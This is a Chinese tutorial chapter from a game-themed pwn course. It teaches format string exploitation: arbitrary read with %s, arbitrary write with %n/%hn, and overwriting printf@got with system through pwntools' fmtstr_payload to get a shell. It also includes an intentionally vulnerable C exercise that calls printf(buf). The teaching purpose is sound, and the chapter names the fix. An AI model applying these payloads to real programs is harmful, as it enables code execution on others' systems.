# 第 15 关 · 游戏修改器：任意地址读与写

## 🎬 游戏开场

上一关，传话 NPC 已经会"泄密"了——你用 `%p` 能让它喊出栈上的各种值。

但真正强的是这两招：

- **透视（任意地址读）**：你告诉 NPC 一个门牌号，它去那个房间把东西读出来喊给你听。用 `%s` 实现。
- **修改器（任意地址写）**：你告诉 NPC 一个门牌号和一个数字，它偷偷去那个房间把值改掉。用 `%n` 实现。

有了这两招，游戏就是你的了：

- 读 GOT 表 → 泄露 libc 基址（第 10 关的老套路）
- 改 GOT 表 → 把 `printf` 的地址换成 `system`，之后程序一打印就等于执行 system

---

## 🧠 核心概念（游戏版）

### 1. 任意地址读：`%s`

`%s` 的作用是"把参数当成字符串的地址，打印那个字符串"。

如果你能把"想读的地址"放到参数位置，再用 `%s`，就能读出那个地址的内容。

做法：

1. 用第 14 关的方法找到"输入在栈上的偏移 N"（假设是 6）。
2. 构造输入：把目标地址放在输入的开头，然后用 `%6$s` 读取"第6个参数指向的字符串"。

```python
payload = p64(target_addr) + b'%6$s'
```

**典型目标**：GOT 表里的函数地址。

```python
payload = p64(elf.got['puts']) + b'%6$s'
# 程序会打印出 puts 在 libc 里的真实地址 → 泄露！
```

注意：地址里可能有 `\x00` 字节，会被字符串截断。所以地址通常要放在输入的**末尾**，或者用其他技巧（这是为什么实战中常常把地址放后面、调整偏移）。

### 2. 任意地址写：`%n`（王牌）

`%n` 是格式化字符串里最危险的指令：

> **`%n` 不打印数字，而是把"到目前为止已经打印的字符数"写入参数指向的地址。**

游戏比喻：NPC 一边数"我已经喊了多少个字"，一边把这个数字偷偷写到你指定的房间。

```c
printf("AAAA%n", &x);   // 打印了4个字符，然后把 4 写入 x
```

结合位置参数，就能往任意地址写：

```python
# 假设偏移是6，目标地址 target
payload = p64(target) + b'%6$n'
# 效果：把"已打印字符数"写入 target
```

### 3. 控制写入的值：%c 与宽度

问题：`%n` 写入的是"已打印字符数"，那怎么让它写入我想要的数字（比如 system 的地址低几位）？

答案是先打印足够多的字符：

```python
# 想写入数字 0x100（256）
payload = p64(target) + b'%' + b'256' + b'c' + b'%6$n'
# %256c 会打印256个字符，于是 %n 写入256
```

`%256c` 意思是"打印一个占 256 字符宽度的字符"——实际只显示1个字符，但补齐了 256 个空格，计数就到 256 了。

**写入大数字的技巧**：完整地址有好几个字节，逐个写太慢。常用技巧是**只改地址的低 2 字节**（`%hn`，写 2 字节）——因为高字节常常相同，改低 16 位就够了。

| 格式符 | 写入大小 |
| --- | --- |
| `%n` | 4 字节 |
| `%hn` | 2 字节 |
| `%hhn` | 1 字节 |
| `%ln` | 8 字节 |

### 4. 实战套路：改 GOT 表

假设要改 `printf@got` 为 `system` 地址：

1. 泄露 libc 基址（用 `%s` 读某个 GOT 项，配合第 10 关算法），算出 `system` 地址。
2. 用 `%n`/`%hn` 把 `system` 地址写进 `printf@got`。
3. 之后程序调用 `printf("something")`，实际执行 `system("something")`。
4. 让程序打印 `/bin/sh`（或输入内容包含它），就 get shell。

pwntools 提供了便利函数：

```python
from pwn import *
# fmtstr_payload(偏移, {目标地址: 要写入的值})
payload = fmtstr_payload(6, {elf.got['printf']: system_addr})
```

它自动生成精妙的 `%c`+`%n` 组合，帮你完成任意写。

## 🔧 真实世界对照

| 游戏说法 | 真实术语 |
| --- | --- |
| 透视 | 任意地址读（`%s`） |
| 修改器 | 任意地址写（`%n`） |
| 数字符个数 | 已输出字符计数 |
| 写入大小 | `%n`=4字节 / `%hn`=2字节 / `%hhn`=1字节 |
| 自动生成作弊码 | `fmtstr_payload()` |

**防御**：和用户数据相关的 `printf` 一定要写死格式串：`printf("%s", input)`。

## 🎯 闯关任务：写个数值进去

程序：

```c
// fmtwrite.c
#include <stdio.h>
int x = 0;
void echo() {
    char buf[100];
    read(0, buf, 100);
    printf(buf);
    printf("\nx = %d\n", x);   // 看看 x 有没有被改
}
int main(){ echo(); }
```

```bash
gcc -g -O0 -no-pie fmtwrite.c -o fmtwrite
nm fmtwrite | grep ' x$'      # 找到全局变量 x 的地址
```

任务：

1. 先用 AAAA 法找到偏移 N。
2. 构造 payload：`<x的地址> + %<N>$n`，看看能不能把 x 改成非0值。
3. 进阶：用 `%<数字>c%N$n` 把 x 改成你想指定的值（比如 1234）。

打通这个，你就拥有"游戏修改器"了。
